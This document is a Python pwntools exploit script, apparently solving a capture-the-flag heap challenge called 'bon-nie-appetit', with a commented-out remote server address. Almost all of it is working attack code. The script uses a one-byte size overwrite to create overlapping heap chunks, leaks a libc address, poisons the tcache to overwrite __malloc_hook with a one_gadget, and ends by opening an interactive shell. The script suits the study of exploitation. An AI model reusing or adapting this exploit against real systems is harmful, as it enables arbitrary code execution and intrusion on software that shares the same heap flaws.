from pwn import *
prompt = b'> '
prompt2 = b": "
#p = remote("138.68.189.179",30415)
p = process("./bon-nie-appetit")
libc = ELF("glibc/libc.so.6")

def make(size,data):
    p.recvuntil(prompt)
    p.sendline(b"1")
    p.recvuntil(prompt2)
    p.sendline(size)
    p.recvuntil(prompt2)
    p.send(data)

def delete(index):
    p.recvuntil(prompt)
    p.sendline(b"4")
    p.recvuntil(prompt2)
    p.sendline(index)

def edit(index,data):
    p.recvuntil(prompt)
    p.sendline(b"3")
    p.recvuntil(prompt2)
    p.sendline(index)
    p.recvuntil(prompt2)
    p.send(data)

def show(index,n=16):
    p.recvuntil(prompt)
    p.sendline(b"2")
    p.recvuntil(prompt2)
    p.sendline(index)
    p.recvuntil(b"=> ")
    return p.recv(n)


size = str(0xf8).encode('utf-8')
freed_size = str(0x71).encode('utf-8')

# Prepare chunks 
for i in range(7):
    make(size,b"A"*25)

# Chunk A and B
make(b"24",b"A"*24) # 7
make(b"24",b"B"*24) # 8

# Chunk C and D
make(size,b"C"*25) # 9
make(size,b"D"*25) # 10

# fill tcache bin
for i in range(7):
    delete(str(i).encode('utf-8'))


# Change size of chunk B
edit(b"7",b"A"*24+b"\x81")

# Free chunk B and C
delete(b"8")
delete(b"9")

# Allocate Chunk B again
make(freed_size,b"B"*32) # 0

# Leak libc
leak = u64(show(b"0",38)[32:38]+b"\x00\x00")
libc_base = leak - 0x3ebca0
print(hex(libc_base))
one_gadget = libc_base + 0x10a2fc
malloc_hook = libc_base + libc.symbols['__malloc_hook']

# Set up heap layout
edit(b"0", b"B"*24 + p64(0x101))
delete(b"0")
make(b"24",b"A"*24) # 0
make(b"24",b"A"*24) # 1
make(b"24",b"A"*24) # 2
delete(b"0")
delete(b"1")

# Malloc chunk B to modify chunk C FD pointer
make(freed_size,b"B"*24 + p64(0x21) +p64(malloc_hook)) # 0

#Malloc to get allocated chunk
make(b"24",b"A"*24) # 1
make(b"24",b"A"*24) # 3
make(b"24",p64(one_gadget)) # 4

p.recvuntil(prompt)
p.sendline(b'1')
p.recvuntil(prompt2)
p.sendline(b'1')
p.interactive()
